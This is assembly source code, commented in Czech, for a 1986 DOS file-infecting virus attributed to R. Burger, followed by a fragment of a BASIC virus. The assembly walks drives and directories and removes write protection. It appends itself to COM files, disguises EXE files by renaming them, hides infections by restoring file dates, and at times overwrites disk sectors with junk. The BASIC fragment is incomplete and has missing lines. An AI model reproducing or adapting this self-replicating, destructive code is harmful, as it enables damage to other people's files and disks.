

;**********************************************************************
; 
; program VIRUS, autor R.Burger 1986, vyvinuto pod MSDOS 2.11
;
; upraveno tak,aby to prelozil prekladac TASM
; zkousen preklad,ale neodzkousena cinnost
;
;**********************************************************************

	PAGE	70,120
	NAME	VIRUS
	
CODE	SEGMENT
	ASSUME	CS:CODE

PROGR	EQU	100H
	ORG	PROGR

MAIN:	NOP			; 3 instrukce NOP slouzi jako priznak zamoreni
	NOP
	NOP
	MOV	AX,0
	MOV	ES:WORD PTR POINTER,AX
	MOV	ES:WORD PTR COUNTER,AX
	MOV	ES:BYTE PTR DISKS,AL
	MOV	AH,19H
	INT	21H		; dotaz na aktualni disk
	MOV	CS:BYTE PTR DRIVE,AL ; uschova aktualniho disku
	MOV	AH,47H
	MOV	DH,0
	ADD	AL,1
	MOV	DL,AL
	LEA	SI,OLDPATH
	INT	21H		; dotaz na aktualni directory
	MOV	AH,0EH
	MOV	DL,0
	INT	21H		; kolik disku?
	CMP	AL,1
	JNZ	HUPS3		; vice nez 1 disk
	MOV	AL,6
HUPS3:	MOV	AH,0
	LEA	BX,SEARCHORDER
	ADD	BX,AX
	ADD	BX,1
	MOV	CS:WORD PTR POINTER,BX
	CLC	; carry je nastaveno,kdyz pri hledani uz neni zadny soubor COM. Potom se EXE
; soubory prejmenuji na COM a infikuji. Start takoveho souboru zpusobi hlaseni
; "Program too big to fit in memory"
CHANGEDISK: 
	JNC	NONAMECHANGE
	MOV	AH,17H		; zmen EXE na COM
	LEA	DX,MASKAEXE
	INT	21H
	CMP	AL,0FFH
	JNZ	NONAMECHANGE	; nalezen EXE?
; nalezne-li se COM nebo EXE,prepisi se sektory disku v zavislosti na hodnote
; systemoveho casu. Je to vetev vlastniho niceni disku.
	MOV	AH,2CH		; cti systemovy cas
	INT	21H
	MOV	BX,CS:WORD PTR POINTER
	MOV	AL,CS:BYTE PTR [BX]
	MOV	BX,DX
	MOV	CX,2
	MOV	DH,0
	INT	26H		; zapis nesmysl na disk
; tady bych doplnil instrukci "POP cokoliv",nebot INT 26H nechava v zasobniku
; flagy navic. Pri cyklu se zbytecne snizuje vrchol zasobniku
; vetev testu na dosazeni konce tabulky SEARCHORDER,kdyz ano,ukoncit
NONAMECHANGE:
	MOV	BX,CS:WORD PTR POINTER
	DEC	BX
	MOV	CS:WORD PTR POINTER,BX
	MOV	DL,CS:BYTE PTR [BX]
	CMP	DL,0FFH
	JNZ	HUPS2
	JMP	HOPS
; novy disk z tabulky vzit a vybrat
HUPS2:	MOV	AH,0EH
	INT	21H		; zmen disk
; zaciname v root directory
	MOV	AH,3BH		; zmen path
	LEA	DX,PATH
	INT	21H
	JMP	FINDFIRSTFILE
; zmenit vsechny EXE na COM,hledat dalsi subdirectory
FINDFIRSTSUBDIR:
	MOV	AH,17H		; zmen EXE na COM
	LEA	DX,MASKAEXE
	INT	21H
	MOV	AH,3BH		; root
	LEA	DX,PATH
	INT	21H
	MOV	AH,04EH	 ; hledej prvni subdir
	MOV	CX,00010001B	; maska dir
	LEA	DX,MASKADIR
	INT	21H
	JC	CHANGEDISK
	MOV	BX,CS:WORD PTR COUNTER
	INC	BX
	DEC	BX
	JZ	USENEXTSUBDIR
; hledame dalsi subdir. Neni-li dalsi,zmenime disk.
FINDNEXTSUBDIR:
	MOV	AH,4FH		; hledej dalsi subdir
	INT	21H
	JC	CHANGEDISK
	DEC	BX
	JNZ	FINDNEXTSUBDIR
; nalezene directory vybereme
USENEXTSUBDIR:
	MOV	AH,2FH		; dej DTA adresu
	INT	21H
	ADD	BX,1CH
	MOV	ES:BYTE PTR [BX],'\'	 ; adresa jmena v DTA
	INC	BX
	PUSH	DS
	MOV	AX,ES
	MOV	DS,AX
	MOV	DX,BX
	MOV	AH,3BH
	INT	21H		 ; zmen path
	POP	DS
	MOV	BX,CS:WORD PTR COUNTER
	INC	BX
	MOV	CS:WORD PTR COUNTER,BX
; nalezt prvni COM soubor v directory. Neni-li,hledame dalsi dir
FINDFIRSTFILE:
	MOV	AH,4EH		; hledej prvni
	MOV	CX,1		; maska
	LEA	DX,MASKACOM
	INT	21H
	JC	FINDFIRSTSUBDIR
	JMP	CHECKIFILL
; je-li program uz infikovan,hledat dalsi
FINDNEXTFILE:
	MOV	AH,4FH		; hledej dalsi
	INT	21H
	JC	FINDFIRSTSUBDIR
; zkusit,zda uz je infikovan
CHECKIFILL:
	MOV	AH,3DH		; otevrit
	MOV	AL,2		; read/write
	MOV	DX,9EH		; adresa jmena v DTA
	INT	21H
	MOV	BX,AX
	MOV	AH,3FH		; read
	MOV	CX,BUFLEN
	MOV	DX,BUFFER
	INT	21H
	MOV	AH,3EH
	INT	21H
	MOV	BX,CS:[BUFFER]
	CMP	BX,9090H	; test na NOP,NOP
	JZ	FINDNEXTFILE
; odstranit pripadnou ochranu proti zapisu
	MOV	AH,43H
	MOV	AL,0
	MOV	DX,9EH		; adresa jmena v DTA
	INT	21H
	MOV	AH,43H
	MOV	AL,1
	AND	CX,11111110B
	INT	21H
; otevrit soubor read/write
	MOV	AH,3DH
	MOV	AL,2
	MOV	DX,9EH
	INT	21H
; schovat datum souboru
	MOV	BX,AX
	MOV	AH,57H
	MOV	AL,0
	INT	21H
	PUSH	CX		; datum
	PUSH	DX
; uschova stareho skoku z adresy 100
	MOV	DX,CS:WORD PTR CONTA
	MOV	CS:[JMPBUF],DX
	MOV	DX,CS:[BUFFER+1] ; novy skok
	LEA	CX,CONT-100H
	SUB	DX,CX
	MOV	CS:WORD PTR CONTA,DX
; virus se sám kopiruje do souboru
	MOV	AH,40H		; write
	MOV	CX,BUFLEN
	LEA	DX,MAIN
	INT	21H
; obnoveni stareho data
	MOV	AH,57H
	MOV	AL,1
	POP	DX
	POP	CX
	INT	21H
; uzavrit soubor
	MOV	AH,3EH
	INT	21H
; obnoveni stareho skoku,aby puvodni program pokud mozno jeste fungoval
	MOV	DX,CS:[JMPBUF]
	MOV	CS:WORD PTR CONTA,DX
HOPS:	NOP
	CALL	USEOLD
; pokracovani v puvodnim programu
CONT:	DB	0E9H		; JMP
CONTA:	DW	0
	MOV	AH,0
	INT	21H

; puvodni disk obnovit
USEOLD:
	MOV	AH,0EH
	MOV	DL,CS:BYTE PTR DRIVE
	INT	21H
; obnovit path
	MOV	AH,3BH
	LEA	DX,OLDPATH-1
	INT	21H
	RET

SEARCHORDER:
	DB	0FFH,1,0,2,3,0FFH,0,0FFH
POINTER:
	DW	0
COUNTER:
	DW	0
DISKS:	DB	0
MASKACOM:
	DB	'*.COM',0
MASKADIR:
	DB	'*',0
MASKAEXE:
	DB	0FFH,0,0,0,0,0,00111111B
	DB	0,'????????EXE',0,0,0,0
	DB	0,'????????COM',0
MASKAALL:
	DB	0FFH,0,0,0,0,0,00111111B
	DB	0,'???????????',0,0,0,0
	DB	0,'????????COM',0
	
BUFFER	EQU	0E000H
BUFLEN	EQU	230H		; delka viru - pozor pri zmenach!!!
JMPBUF	EQU	BUFFER+BUFLEN

PATH:	DB	'\',0
DRIVE:	DB	0
BACKSLASH:
	DB	'\'
OLDPATH:
	DB	32 DUP(?)

CODE	ENDS

	END	MAIN


; **********************************************************************
;
; priklad programu na vyhledan REM *** priznak viru a nove jmeno
590 OPEN OLDNAME$ FOR APPEND AS #1 LEN=13
600 WRITE #1,NEWNAME$
610 CLOSE #1
630 PRINT "Infekce v:";OLDNAME$;" Velmi nebezpecne!"
640 REM *** start originalniho programu
650 GOTO 9999
680 REM *** za prikazem RUN je prostor pro APPEND jmena. Nesmi tam byt CR,LF.
9999 RUN
